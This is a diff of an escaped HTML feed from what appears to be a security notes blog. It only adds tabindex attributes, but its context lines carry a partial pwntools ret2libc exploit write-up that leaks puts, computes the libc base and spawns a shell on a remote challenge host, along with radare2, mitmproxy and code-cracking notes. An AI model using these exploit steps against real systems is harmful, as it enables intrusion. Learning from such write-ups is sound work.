-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ objdump -D ./binary| grep &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;system&amp;#39;&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ objdump -D ./binary| grep &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;system&amp;#39;&lt;/span&gt;
 &lt;span style=&#34;color:#75715e&#34;&gt;# empty output&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We don&amp;rsquo;t have it in our binary, so we need to find it in the memory by tracing common functions - in our case &lt;code&gt;puts&lt;/code&gt;.&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Stage 2, ret2shell&amp;#34;&lt;/span&gt;)
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Stage 2, ret2shell&amp;#34;&lt;/span&gt;)
 &lt;span style=&#34;color:#75715e&#34;&gt;# calculate offset, base address of the libc in the memory&lt;/span&gt;
 libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;address &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; leaked_puts &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; libc&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;symbols[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;puts&amp;#39;&lt;/span&gt;]
 
@@ -476,13 +476,13 @@ payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=
 p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendline(payload)
 p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The last line (&lt;code&gt;p.interactive()&lt;/code&gt;) spawns the interactive shell:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ ps
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ ps
   PID TTY          TIME CMD
    &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt; ?        00:00:00 binary
    &lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt; ?        00:00:00 sh
    &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt; ?        00:00:00 sh
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;full-script&#34;&gt;Full script&lt;/h2&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; pwn
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; pwn
 
 &lt;span style=&#34;color:#75715e&#34;&gt;#p = pwn.process(&amp;#39;./binary&amp;#39;)&lt;/span&gt;
 p &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;remote(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;138.68.182.108&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;30784&lt;/span&gt;)
@@ -556,7 +556,7 @@ p&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
 &lt;li&gt;&lt;a href=&#34;https://mitmproxy.org/&#34;&gt;https://mitmproxy.org/&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;h2 id=&#34;start&#34;&gt;Start&lt;/h2&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# start (default port 8080)&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# start (default port 8080)&lt;/span&gt;
 $ mitmproxy
 
 &lt;span style=&#34;color:#75715e&#34;&gt;# web gui&lt;/span&gt;
@@ -629,7 +629,7 @@ $ mitmpdump &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;google\.com&amp;#
 &lt;/table&gt;
 &lt;h2 id=&#34;intercept-requests&#34;&gt;Intercept Requests&lt;/h2&gt;
 &lt;p&gt;Press &lt;code&gt;I&lt;/code&gt; after starting mitmproxy and type command&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Regex based on URL&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Regex based on URL&lt;/span&gt;
 ~u RegexHere
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;RED&lt;/strong&gt; colored requests are intercepted enter into it and press &lt;code&gt;E&lt;/code&gt; to modify request content&lt;/p&gt;</content>
     </item>
@@ -651,13 +651,13 @@ $ mitmpdump &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;google\.com&amp;#
 &lt;/ul&gt;
 &lt;h2 id=&#34;debugging&#34;&gt;Debugging&lt;/h2&gt;
 &lt;h4 id=&#34;manage-file&#34;&gt;Manage file&lt;/h4&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# open in debug mode&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# open in debug mode&lt;/span&gt;
 r2 -d $FILE
 
 doo &lt;span style=&#34;color:#75715e&#34;&gt;# re-open file in debug mode&lt;/span&gt;
 ood &lt;span style=&#34;color:#75715e&#34;&gt;# /&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;flow-control&#34;&gt;Flow control&lt;/h4&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# display / set breakpoint&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# display / set breakpoint&lt;/span&gt;
 db &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;flag/addr&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
 
 &lt;span style=&#34;color:#75715e&#34;&gt;# continue to breakpoint&lt;/span&gt;
@@ -675,7 +675,7 @@ ds &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;N&lt;span style=&#34;
 &lt;span style=&#34;color:#75715e&#34;&gt;# step over N instructions&lt;/span&gt;
 dso &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;N&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;reverse-debugging&#34;&gt;Reverse debugging&lt;/h3&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;dts?
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;dts?
 
 &lt;span style=&#34;color:#75715e&#34;&gt;# select some point&lt;/span&gt;
 db sym.foo
@@ -691,28 +691,28 @@ dsb
 dtst sessions.dbg
 dtsf sessions.dbg
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;read-values&#34;&gt;Read values&lt;/h4&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# show registers&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# show registers&lt;/span&gt;
 drr
 
 &lt;span style=&#34;color:#75715e&#34;&gt;# show stack contents&lt;/span&gt;
 pxr @ rsp!32
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;scripting-hooks&#34;&gt;Scripting (hooks)&lt;/h4&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# auto-run command on breakpoint&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# auto-run command on breakpoint&lt;/span&gt;
 db main  						&lt;span style=&#34;color:#75715e&#34;&gt;# set breakpoint&lt;/span&gt;
 dbc main drr					&lt;span style=&#34;color:#75715e&#34;&gt;# set command on breakpoint &lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;custom-environment&#34;&gt;Custom environment&lt;/h4&gt;
 &lt;blockquote&gt;
 &lt;p&gt;Note that when first starting radare2 in debug mode, you will actually be debugging rarun2! &lt;em&gt;You need to first continue execution (dc)&lt;/em&gt; which will leave you in the loader for the program itself.&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# run program with custom environment&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# run program with custom environment&lt;/span&gt;
 r2 -d rarun2 program&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;./&amp;lt;program_name&amp;gt; arg0&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;foo stdin&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;./&amp;lt;some_file&amp;gt; setenv&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;ENV_VAR&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;lt;value&amp;gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;==OR==&lt;/p&gt;
-&lt;pre&gt;&lt;code class=&#34;language-rr2&#34; data-lang=&#34;rr2&#34;&gt;#!/usr/bin/rarun2
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-rr2&#34; data-lang=&#34;rr2&#34;&gt;#!/usr/bin/rarun2
 program=./&amp;lt;program_name&amp;gt;
 arg0=foo
 stdin=./&amp;lt;some_file&amp;gt;
 setenv=ENV_VAR=&amp;lt;value&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;r2 -d rarun2 script.rr2
+&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;r2 -d rarun2 script.rr2
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;visual-debugging&#34;&gt;Visual debugging&lt;/h2&gt;
 &lt;blockquote&gt;
 &lt;p&gt;(Enter &lt;code&gt;V&lt;/code&gt; command to enter or &lt;code&gt;VV&lt;/code&gt; / &lt;code&gt;VV!&lt;/code&gt;), with [p] / [P] you can change views)&lt;/p&gt;
@@ -739,17 +739,17 @@ setenv=ENV_VAR=&amp;lt;value&amp;gt;
 &lt;li&gt;&lt;a href=&#34;https://monosource.gitbooks.io/radare2-explorations/content/tut3/tut3_-_esil.html&#34;&gt;ESIL · Radare2 Explorations&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href=&#34;https://radare.gitbooks.io/radare2book/content/disassembling/esil.html&#34;&gt;ESIL · Radare2 Book&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
-&lt;pre&gt;&lt;code class=&#34;language-radare2rc&#34; data-lang=&#34;radare2rc&#34;&gt;e asm.emu = true # esil comments
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-radare2rc&#34; data-lang=&#34;radare2rc&#34;&gt;e asm.emu = true # esil comments
 e io.cache = true # write in memory cache
 &lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;visual-mode&#34;&gt;Visual mode&lt;/h4&gt;
 &lt;ul&gt;
 &lt;li&gt;[O] - toggle pseudocode / ESIL&lt;/li&gt;
 &lt;/ul&gt;
 &lt;h4 id=&#34;commands&#34;&gt;Commands&lt;/h4&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# check used registers by the function&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# check used registers by the function&lt;/span&gt;
 aeaf
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;example-session&#34;&gt;Example session&lt;/h4&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;aei 	&lt;span style=&#34;color:#75715e&#34;&gt;# init esil vm &lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;aei 	&lt;span style=&#34;color:#75715e&#34;&gt;# init esil vm &lt;/span&gt;
 aeim  &lt;span style=&#34;color:#75715e&#34;&gt;# init mem &lt;/span&gt;
 aeip 	&lt;span style=&#34;color:#75715e&#34;&gt;# set esil vm pointer to current seek&lt;/span&gt;
 aer	&lt;span style=&#34;color:#75715e&#34;&gt;# handle esil registers&lt;/span&gt;
@@ -762,7 +762,7 @@ aer eax&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;0x1234 &lt;span s
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;macros&#34;&gt;Macros&lt;/h2&gt;
 &lt;p&gt;&lt;a href=&#34;https://radare.gitbooks.io/radare2book/content/scripting/macros.html&#34;&gt;Macros · Radare2 Book&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;Example session&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# set up relative breakpoints. one per cmp instruction*&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# set up relative breakpoints. one per cmp instruction*&lt;/span&gt;
 db sym.check_code_int+0x00001289-0x00001265
 db sym.check_code_int+0x000012b7-0x00001265
 db sym.check_code_int+0x000012e2-0x00001265
@@ -778,7 +778,7 @@ dc* &lt;span style=&#34;color:#75715e&#34;&gt;# input four digits (doesn&amp;#39
 .&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;eax_replace &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;@@&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; 3*# show the results*
 !cat ./crack_code
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;malware-analysis&#34;&gt;Malware Analysis&lt;/h2&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ob&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;# show open files&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ob&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;# show open files&lt;/span&gt;
 afl&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# list function ranges&lt;/span&gt;
 aflt &lt;span style=&#34;color:#75715e&#34;&gt;# show function table&lt;/span&gt;
 
@@ -786,8 +786,8 @@ p&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;   &lt;span style=&#34;
 p&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;# show hist entropy horizontal&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;operations&#34;&gt;Operations&lt;/h2&gt;
 &lt;h4 id=&#34;writing&#34;&gt;Writing&lt;/h4&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;r2 -w binary
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# write null-terminated string&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;r2 -w binary
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# write null-terminated string&lt;/span&gt;
 wz &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;hello there&amp;#34;&lt;/span&gt;
 psz &lt;span style=&#34;color:#75715e&#34;&gt;# print it&lt;/span&gt;
 
@@ -795,7 +795,7 @@ psz &lt;span style=&#34;color:#75715e&#34;&gt;# print it&lt;/span&gt;
 wx deadbeef @ 0x30
 p8 @ 0x30!4 &lt;span style=&#34;color:#75715e&#34;&gt;# print&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;write-in-block&#34;&gt;Write in block&lt;/h4&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;wo?
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;wo?
 
 &lt;span style=&#34;color:#75715e&#34;&gt;# write bytes in sequence starting from 42, incrementing by 3&lt;/span&gt;
 woe &lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; @ edi!32
@@ -902,7 +902,7 @@ wx &lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt; @ esp!32
 &lt;p&gt;&lt;strong&gt;Resolution&lt;/strong&gt;: You need to replace configuration with the valid one.&lt;/p&gt;
 &lt;p&gt;Some binaries are using special configuration files to load binary located in &lt;em&gt;Resources/Configuration Files/1.&lt;/em&gt; To fix this issue edit the configuration manually or paste (with i.e hex editor) the default one presented below:&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;Default configuration.xml&lt;/strong&gt;&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34; standalone=&amp;#34;yes&amp;#34;?&amp;gt;&lt;/span&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34; standalone=&amp;#34;yes&amp;#34;?&amp;gt;&lt;/span&gt;
 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;assembly&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;xmlns=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;urn:schemas-microsoft-com:asm.v1&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;manifestVersion=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1.0&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
   &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;assemblyIdentity&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;version=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1.0.0.0&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;name=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;MyApplication.app&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&amp;gt;&lt;/span&gt;
   &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;trustInfo&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;xmlns=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;urn:schemas-microsoft-com:asm.v2&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
@@ -935,7 +935,7 @@ wx &lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt; @ esp!32
 &lt;h3 id=&#34;auto&#34;&gt;Auto&lt;/h3&gt;
 &lt;h4 id=&#34;with-pe_unmapper&#34;&gt;With pe_unmapper&lt;/h4&gt;
